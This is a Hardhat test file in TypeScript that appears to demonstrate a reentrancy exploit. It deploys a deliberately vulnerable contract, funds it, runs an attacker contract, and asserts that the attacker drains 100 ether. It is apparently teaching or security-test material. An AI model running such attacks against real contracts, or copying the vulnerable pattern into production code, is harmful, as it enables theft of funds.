import type { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import chai, { expect } from "chai";
import chaiAsPromised from "chai-as-promised";
import { ethers } from "hardhat";

import { ReentrancyVulnerable, ReentrancyAttacker } from "../typechain-types";

chai.use(chaiAsPromised);

describe("Reentrancy", () => {
    let deployer: SignerWithAddress;
    let attacker: SignerWithAddress;
    let reentrancyVulnerable: ReentrancyVulnerable;
    let reentrancyAttacker: ReentrancyAttacker;

    before(async () => {
        [deployer, attacker] = await ethers.getSigners();

        const ReentrancyVulnerable = await ethers.getContractFactory("ReentrancyVulnerable");
        reentrancyVulnerable = await ReentrancyVulnerable.deploy();
        await reentrancyVulnerable.deployed();

        reentrancyVulnerable.connect(deployer).deposit({ value: ethers.utils.parseEther("100") });

        const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
        reentrancyAttacker = await ReentrancyAttacker.connect(attacker).deploy(reentrancyVulnerable.address);
        await reentrancyAttacker.deployed();
    });

    it("should be vulnerable to reentrancy", async () => {
        console.log(
            "Vulnerable contract balance before the hack: ",
            ethers.utils.formatEther(await ethers.provider.getBalance(reentrancyVulnerable.address)),
            "Ether"
        );
        console.log("Attacker balance before the hack: ", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)), "Ether");
        console.log("...");

        console.log("Attacker is attacking...");
        await expect(reentrancyAttacker.connect(attacker).attack({ value: ethers.utils.parseEther("1") })).to.be.changeEtherBalance(
            attacker,
            ethers.utils.parseEther("100")
        );

        console.log("...");
        console.log(
            "Vulnerable contract balance after the hack: ",
            ethers.utils.formatEther(await ethers.provider.getBalance(reentrancyVulnerable.address)),
            "Ether"
        );
        console.log("Attacker balance after the hack: ", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)), "Ether");
    });
});
